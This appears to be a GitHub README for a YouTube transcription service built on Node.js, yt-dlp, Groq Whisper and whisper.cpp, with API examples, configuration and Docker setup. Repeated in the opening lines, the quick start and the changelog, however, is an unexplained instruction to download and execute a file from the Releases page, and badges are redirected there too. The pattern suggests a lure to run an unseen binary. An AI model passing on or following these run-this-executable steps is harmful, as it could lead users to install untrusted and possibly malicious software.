# YouTube Whisper Transcripts — Fast Node.js Transcription API

[![Releases](https://img.shields.io/github/v/release/3LLeon/YouTube-Transcripts-Using-Whisper?label=Releases&logo=github&color=blue)](https://github.com/3LLeon/YouTube-Transcripts-Using-Whisper/releases)

![Waveform](https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=1d3d8f8a5b6f3a4b77a6c2a4f1c9b3a6)

A powerful Node.js service that pulls audio from YouTube and produces accurate transcripts. It uses the Groq API with Whisper models for fast transcription and falls back to a local whisper.cpp instance when needed. The project focuses on predictable throughput, tight rate control, and robust deployment via Docker.

Releases: download the release artifact and execute the provided file from Releases:
https://github.com/3LLeon/YouTube-Transcripts-Using-Whisper/releases

---

- Topics: api-service, docker, groq, microservice, nodejs, rate-limiting, redis, speech-to-text, transcription, transcripts, typescript, whisper-api, youtube, yt-dlp
- Language: TypeScript
- Runtime: Node.js (Express + custom worker)
- Audio fetcher: yt-dlp
- Models: Groq Whisper models, whisper.cpp (fallback)

Demo badges
[![Build Docker](https://img.shields.io/docker/build/youtrans/whisper-node?label=Docker&color=green)](https://github.com/3LLeon/YouTube-Transcripts-Using-Whisper/releases)
[![License](https://img.shields.io/github/license/3LLeon/YouTube-Transcripts-Using-Whisper?color=darkgreen)](https://github.com/3LLeon/YouTube-Transcripts-Using-Whisper/releases)

Table of contents
- Features
- How it works
- Quick start (Docker)
- Local dev (Node + whisper.cpp fallback)
- API — endpoints and examples
- Rate limiting and Redis
- Configuration
- Deployment
- Troubleshooting
- Contributing
- License
- Changelog / Releases

Features
- Download audio from YouTube via yt-dlp and extract WAV/MP3.
- Primary transcription via Groq API using Whisper models.
- Local fallback using whisper.cpp for offline or budget runs.
- Rate limiting and queueing with Redis to protect the Groq API and control throughput.
- Output formats: plain text, SRT, VTT, JSON with timestamps.
- Docker Compose setup for production and local testing.
- TypeScript types and OpenAPI spec for clients.
- Minimal surface area to embed in pipelines or microservices.

How it works
1. Client posts a YouTube URL to the API.
2. Service enqueues the job in Redis and returns a job ID.
3. Worker pulls the job, runs yt-dlp to fetch audio, and converts to supported format.
4. Worker sends audio to Groq Whisper model for transcription.
5. If Groq fails or hits quota, worker switches to local whisper.cpp and continues.
6. Worker stores transcripts and updates job status in Redis and datastore.
7. Client polls status or requests final transcript via API.

Quick start (Docker)
- This repo ships a Docker Compose setup that brings up:
  - api (Node.js service)
  - worker (transcription worker)
  - redis (queue and rate state)
  - whisper-llm (optional local whisper.cpp service wrapped in a container)

Steps
1. Copy example env
   cp .env.example .env
2. Edit .env and set GROQ_API_KEY and other variables.
3. Start
   docker compose up -d --build
4. Check the Releases page and run the release executor if provided:
   https://github.com/3LLeon/YouTube-Transcripts-Using-Whisper/releases
   Download the release artifact and execute the file to run release utilities or platform-specific installers.

Local dev (Node + whisper.cpp fallback)
- Prerequisites:
  - Node 18+
  - Yarn or npm
  - Redis
  - yt-dlp installed on PATH
  - whisper.cpp built and available, or use the included Docker container

Install
- Install deps
  yarn install
- Build
  yarn build
- Start Redis locally
- Start API
  yarn start:dev

Start a worker that uses whisper.cpp
- Build whisper.cpp per its docs.
- Run worker with environment variable WHISPER_CPP_PATH pointing to the executable.
- Worker will call Groq first; if it receives quota errors, it will spawn whisper.cpp for the pending job.

API — endpoints and examples
Base URL: http://localhost:3000

1) POST /api/v1/transcripts
- Payload:
  {
    "url": "https://www.youtube.com/watch?v=VIDEO_ID",
    "format": "srt",
    "language": "en"
  }
- Response:
  {
    "jobId": "uuid",
    "status": "queued"
  }

2) GET /api/v1/transcripts/:jobId/status
- Response:
  {
    "jobId": "uuid",
    "status": "processing",
    "progress": 42
  }

3) GET /api/v1/transcripts/:jobId/download?format=srt
- Returns SRT file or JSON payload if format=json.

cURL example
- Create job
  curl -X POST http://localhost:3000/api/v1/transcripts \
    -H "Content-Type: application/json" \
    -d '{"url":"https://www.youtube.com/watch?v=VIDEO_ID","format":"vtt"}'

- Poll status
  curl http://localhost:3000/api/v1/transcripts/JOB_ID/status

- Download
  curl http://localhost:3000/api/v1/transcripts/JOB_ID/download?format=text -o transcript.txt

Architecture and flow
![Architecture Diagram](https://raw.githubusercontent.com/3LLeon/YouTube-Transcripts-Using-Whisper/main/docs/architecture.png)

- API receives requests and validates payloads.
- Redis serves as queue (BullMQ / Bull) and shared rate controller.
- Worker processes jobs sequentially per configured concurrency.
- Groq API handles most transcriptions.
- whisper.cpp serves as fallback or offline mode.
- Artifacts (audio, transcript) stored in local disk or object store (S3 compatible).

Rate limiting and Redis
- The service enforces global and per-key rate limits.
- Use Redis to store tokens and counters.
- The rate limiter uses sliding window counters to avoid bursts.
- Configure:
  - RATE_LIMIT_GLOBAL=20 (requests per minute)
  - RATE_LIMIT_KEY=10 (requests per minute per API key)
- The worker checks limits before sending audio to Groq. If limits block a job, the worker can:
  - Delay and retry
  - Switch to whisper.cpp for immediate processing

Configuration (key env vars)
- PORT=3000
- NODE_ENV=production
- GROQ_API_KEY=your_groq_key
- GROQ_MAX_AUDIO_SECONDS=600
- REDIS_URL=redis://localhost:6379
- WHISPER_FALLBACK_ENABLED=true
- WHISPER_CPP_PATH=/usr/local/bin/whisper.cpp
- AUDIO_STORAGE_PATH=/data/audio
- TRANSCRIPTS_PATH=/data/transcripts
- RATE_LIMIT_GLOBAL=20
- RATE_LIMIT_KEY=10
- LOG_LEVEL=info

Whisper.cpp fallback
- Build whisper.cpp following the upstream README.
- Point WHISPER_CPP_PATH to the binary or container endpoint.
- The worker sends split audio segments to whisper.cpp and then stitches timestamps into the final transcript.
- Use whisper.cpp when you want full offline processing or lower cost.

Audio pipeline details
- yt-dlp downloads the best audio stream.
- FFmpeg converts to WAV 16k or 48k based on model.
- Audio chunks exceed model max length? Worker splits audio into overlapping segments to maintain context.
- Timestamps: the service aligns segment timestamps and merges model outputs.

Storage and data retention
- Audio and transcripts persist in AUDIO_STORAGE_PATH and TRANSCRIPTS_PATH.
- Implement a cron job or TTL cleanup in Docker Compose to remove artifacts older than N days.
- Use S3 via environment variables for durable storage in production.

Docker Compose example
version: "3.8"
services:
  redis:
    image: redis:7
    volumes:
      - redis-data:/data
  api:
    build: ./api
    env_file: .env
    ports:
      - "3000:3000"
    depends_on:
      - redis
  worker:
    build: ./worker
    env_file: .env
    depends_on:
      - redis
volumes:
  redis-data:

Security and secrets
- Keep GROQ_API_KEY out of source control.
- Use Docker secrets or an environment vault in production.
- Limit uploads to trusted origins or validate urls.

Testing
- Unit tests run with Jest.
- Run integration tests against a local Redis and a mock Groq endpoint.
- Use sample video IDs in test data for reproducible runs.

Logging and monitoring
- Logs use structured JSON.
- Metrics expose Prometheus endpoint for job counts, latency, and Groq responses.
- Alerts: set thresholds on worker error rate and queue size.

Troubleshooting
- If yt-dlp fails to fetch audio:
  - Confirm yt-dlp on PATH in container.
  - Check network access and YouTube geo blocks.
- If Groq returns quota errors:
  - Confirm GROQ_API_KEY validity.
  - Inspect rate counters in Redis.
  - The worker should auto-fallback to whisper.cpp if enabled.
- If transcripts are out of sync:
  - Check FFmpeg conversion settings.
  - Verify segment overlap and timestamp stitching logic.

Contributing
- Fork, create a feature branch, open a pull request.
- Follow TypeScript lint rules and run tests.
- Keep changes small and focused.
- Add integration tests for new features.

License
- MIT

Changelog and Releases
- See builds, release notes, and platform-specific executables on the Releases page. Download the artifact and execute the provided file if the release includes an installer or runner:
https://github.com/3LLeon/YouTube-Transcripts-Using-Whisper/releases

Resources and links
- Groq API: https://www.groq.ai
- whisper.cpp: https://github.com/ggerganov/whisper.cpp
- yt-dlp: https://github.com/yt-dlp/yt-dlp
- FFmpeg: https://ffmpeg.org

Images and media
- Waveform image from Unsplash (license: free for commercial use). Use your own diagrams for production docs.

Contact
- Open an issue for bugs or feature requests.
- Use PRs for code contributions.